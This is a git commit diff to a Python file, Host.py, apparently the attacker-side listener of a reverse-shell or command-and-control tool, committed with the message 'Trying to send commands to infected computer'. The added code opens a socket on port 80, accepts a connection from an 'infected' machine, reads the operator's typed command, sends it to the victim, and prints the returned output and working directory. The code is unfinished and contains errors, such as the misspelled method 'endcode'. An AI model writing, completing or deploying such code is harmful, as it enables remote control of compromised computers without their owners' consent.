0fe65e9c0125799d786f9fed91beb30ce998dbc9
red2922 <jinthavongsa1@gmail.com>
2023-05-08 21:38:50 -0500

    Trying to send commands to infected computer

--- Host.py
+++ Host.py
@@ -26,6 +26,13 @@ it so whenever any laptop can run the code
 Host = "0.0.0.0"  #Host listens on everything
 Port = 80           #HTTP Port
 
+Size = 1024 * 128  #Size of message
+
+message = "Thank You for Connecting!"
+
+b_mess = bytes(message, 'ascii')
+
+SEP = "<sep>"
 
 s = socket.socket()  #Creating a socket 
 s.bind((Host,Port)) # binds the host IP to port 
@@ -37,6 +44,19 @@ while True:
 
     infected, client_address = s.accept()       #Accepts connection from Infected and stores Infected as the IP address and client_address as the port
     print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who connected
-    infected.send("Thank You for Connecting!") #Sends a message to infected. Not currently working. Pls convert to 
+   
+
+    cwd = infected.recv(Size).decode()
+
+    command = input(f"{cwd}$> ")
+    infected.send(command.endcode())
+
+    output = infected.recv(Size).decode()
+    results, cwd = output.split(SEP)
+
+
+    print("Current working directory: ",cwd)
+   
+    infected.send(b_mess) #Sends a message to infected. Not currently working. Pls convert to 
     infected.close() #Cuts connection
 
